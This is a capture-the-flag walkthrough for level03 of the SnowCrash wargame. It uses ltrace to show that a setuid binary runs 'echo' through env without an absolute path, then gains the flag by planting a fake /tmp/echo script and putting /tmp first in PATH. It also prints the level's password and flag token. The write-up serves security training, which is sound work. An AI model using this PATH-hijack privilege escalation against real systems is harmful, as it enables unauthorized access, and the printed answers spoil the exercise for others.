Login as `level03`.
```shell
┌──$ [~/42/2020/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level03
level03@192.168.1.64's password: kooda2puivaav1idi4f57q8iq
```

An executable file is located in home directory.
```shell
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
```
Use `ltrace` program that simply runs the specified command until it exits.

It intercepts and records the dynamic library calls as well as the system calls executed by the program.
```gdb
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid() = 2003
geteuid() = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 0
+++ exited (status 0) +++
```
`system("/usr/bin/env echo Exploit me")` shows that echo command is executed without absolute path.
This is a common path vulnerability.

So real `echo` can be faked with a script or symlink.
For best practice is recommended to execute binaries by absolute path to avoid this type of vulnerability.
```shell
level03@SnowCrash:~$ vi /tmp/echo
#!/bin/bash
/bin/getflag
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ export PATH="/tmp:$PATH"
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
